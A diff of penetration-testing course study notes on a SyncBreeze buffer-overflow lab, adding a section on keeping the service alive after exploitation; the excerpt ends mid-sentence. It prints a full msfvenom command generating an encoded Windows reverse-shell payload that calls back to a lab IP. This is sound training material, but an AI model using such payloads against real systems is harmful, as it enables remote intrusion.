@@ -400,4 +400,19 @@ The GetPC routine execution changes a few bytes of the encoder itself (and possi
 
 Once 10 NOPs are added we immediately get a reverse shell.
 
+![[Pasted image 20220714003655.png]]
+
 ![[Pasted image 20220714002733.png]]
+
+# 11.2.15 - Improving the Exploit
+#### Exercises
+
+_(To be performed on your own Kali and Windows lab client machines - Reporting is required for these exercises)_
+
+1.  Update the exploit so that SyncBreeze still runs after exploitation.
+
+This was avoided by using the _ExitThread_ API by generating the shellcode via the following command:
+
+`msfvenom -p windows/shell_reverse_tcp LHOST=192.168.119.233 LPORT=443 EXITFUNC=thread -f c –e x86/shikata_ga_nai -b "\x00\x0a\x0d\x25\x26\x2b\x3d"`
+
+As we already included the "EXITFUNC=thread" in 
